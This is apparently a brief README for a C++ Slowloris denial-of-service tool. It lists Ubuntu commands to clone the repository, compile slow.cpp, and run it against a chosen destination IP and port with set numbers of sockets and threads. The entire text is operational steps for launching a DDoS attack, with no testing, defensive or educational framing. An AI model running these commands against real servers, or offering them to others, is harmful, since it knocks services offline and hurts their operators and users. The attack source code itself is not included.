For ubuntu

git clone https://github.com/vsouda/SlowLorisDDoSAttackCPP.git
$ cd SlowLorisDDoSAttackCPP
$ g++ slow.cpp -std=c++0x -pthread -o out
$ ./out <dest_ip> <dest_port_num> <num_sockets> <num_threads>
